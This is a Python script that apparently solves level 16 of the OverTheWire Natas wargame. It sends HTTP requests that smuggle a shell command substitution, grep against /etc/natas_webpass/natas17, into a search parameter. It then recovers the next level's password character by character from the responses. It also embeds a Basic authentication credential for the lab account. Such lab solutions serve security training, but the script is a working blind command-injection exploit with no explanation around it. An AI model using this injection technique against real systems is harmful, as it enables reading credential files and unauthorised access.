import socket
debug = True

HOST = "natas16.natas.labs.overthewire.org"
PORT = 80
#header = """GET /?needle=$(grep%20^{c}%20/etc/natas_webpass/natas17)penetration&submit=Search HTTP/1.1
#Host: natas16.natas.labs.overthewire.org
#Authorization: Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA==
#Content-Type: application/x-www-form-urlencoded\r\n\r\n"""
header = """GET /?needle=$(grep%20^{c}%20/etc/natas_webpass/natas17)penetration&submit=Search HTTP/1.1
Host: natas16.natas.labs.overthewire.org
Authorization: Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA==
Content-Type: application/x-www-form-urlencoded\r\n\r\n"""
ALPH = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"

def natas16(p):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    HEAD=bytes(header.format(c=p), 'utf-8')
    if debug:
        print(str(HEAD))
    s.send(HEAD)

    r = str(s.recv(8192))
    s.close()

    if "penetration" not in r:
        return True
    return False

p = ''
for i in range(64):
    f = False
    for c in ALPH:
        print (p, c)
        if natas16(p + c):
            f = True
            p = p + c
            break
    if not f:
        break

print ("DONE")
print (p)
